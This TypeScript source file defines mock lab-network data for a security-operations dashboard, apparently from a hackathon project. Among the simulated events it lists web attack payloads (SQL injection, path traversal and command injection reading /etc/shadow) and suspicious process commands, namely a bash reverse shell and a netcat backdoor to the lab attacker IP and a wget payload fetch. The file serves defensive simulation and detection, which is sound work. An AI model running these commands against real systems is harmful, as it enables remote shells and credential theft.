/**
 * The lab network the mock data describes.
 *
 * Mirrors the real hackathon topology (Kali attacker → Ubuntu victim → SOC
 * backend) so generated events stay internally consistent: a "victim" is
 * always the destination, an "attacker" is always the source, and IPs never
 * contradict each other between panels.
 */
import type { Host } from '@/types/security';

export const VICTIM_IP = '192.168.56.105';
export const ATTACKER_IP = '192.168.56.106';
export const SECONDARY_ATTACKER_IP = '192.168.56.107';
export const SENSOR_IP = '192.168.56.104';

/** Off-subnet sources, used for internet-facing noise and exfil destinations. */
export const EXTERNAL_SCANNER_IP = '10.10.10.24';
export const EXFIL_DESTINATION_IP = '45.137.21.88';

/**
 * Additional internet-facing sources.
 *
 * A host exposed to the internet is touched by opportunistic scanners
 * constantly, not just by the lab attacker. Including them keeps "Top Attack
 * Sources" populated with a realistic long tail instead of three identical
 * rows, and gives the risk ranking something meaningful to order.
 */
export const OPPORTUNISTIC_SOURCES = ['45.155.205.233', '185.220.101.47', '103.97.203.18'] as const;

export const HOST_IDS = {
  victim: 'ubuntu-victim',
  attacker: 'kali-attacker',
  sensor: 'soc-sensor',
} as const;

/**
 * Baseline host inventory. The mock provider mutates CPU/memory/network around
 * these values; the Ubuntu provider will replace them with real telemetry.
 */
export const INITIAL_HOSTS: Host[] = [
  {
    id: HOST_IDS.victim,
    hostname: 'ubuntu-victim',
    ip: VICTIM_IP,
    os: 'Ubuntu 22.04 LTS',
    role: 'victim',
    status: 'online',
    cpu: 24,
    memory: 41,
    network: 'normal',
    lastSeen: Date.now(),
  },
  {
    id: HOST_IDS.sensor,
    hostname: 'soc-sensor',
    ip: SENSOR_IP,
    os: 'Debian 12 (Suricata)',
    role: 'sensor',
    status: 'online',
    cpu: 38,
    memory: 55,
    network: 'normal',
    lastSeen: Date.now(),
  },
  {
    id: HOST_IDS.attacker,
    hostname: 'kali-attacker',
    ip: ATTACKER_IP,
    os: 'Kali Linux 2024.3',
    role: 'attacker',
    status: 'online',
    cpu: 61,
    memory: 34,
    network: 'elevated',
    lastSeen: Date.now(),
  },
];

/** Usernames the mock brute-force attempts cycle through. */
export const TARGET_USERNAMES = ['root', 'admin', 'ubuntu', 'postgres', 'deploy', 'test'];

/** Ports a scan realistically touches, in ascending order. */
export const SCANNED_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389, 5432, 8080];

/** Web paths used by the web-attack scenario. */
export const WEB_ATTACK_PAYLOADS = [
  { path: "/login.php?user=admin'--", label: 'SQL injection attempt', signature: 'ET WEB_SPECIFIC_APPS SQL Injection' },
  { path: '/../../../../etc/passwd', label: 'Path traversal attempt', signature: 'ET WEB_SERVER Directory Traversal' },
  { path: '/index.php?cmd=;cat+/etc/shadow', label: 'Command injection attempt', signature: 'ET WEB_SERVER Command Injection' },
  { path: '/admin/config.bak', label: 'Sensitive file probe', signature: 'ET POLICY Backup File Access' },
];

/** Processes the audit-log scenarios reference. */
export const SUSPICIOUS_PROCESSES = [
  { cmd: '/bin/bash -i >& /dev/tcp/192.168.56.106/4444 0>&1', parent: 'apache2', label: 'Reverse shell invocation' },
  { cmd: 'nc -e /bin/sh 192.168.56.106 9001', parent: 'sh', label: 'Netcat backdoor' },
  { cmd: 'python3 -c "import pty;pty.spawn(\'/bin/bash\')"', parent: 'sh', label: 'TTY upgrade' },
  { cmd: 'wget http://192.168.56.106/payload.sh -O /tmp/.x', parent: 'bash', label: 'Payload retrieval' },
];

export function hostIdForIp(ip: string): string {
  switch (ip) {
    case VICTIM_IP:
      return HOST_IDS.victim;
    case ATTACKER_IP:
      return HOST_IDS.attacker;
    case SENSOR_IP:
      return HOST_IDS.sensor;
    default:
      return HOST_IDS.victim;
  }
}
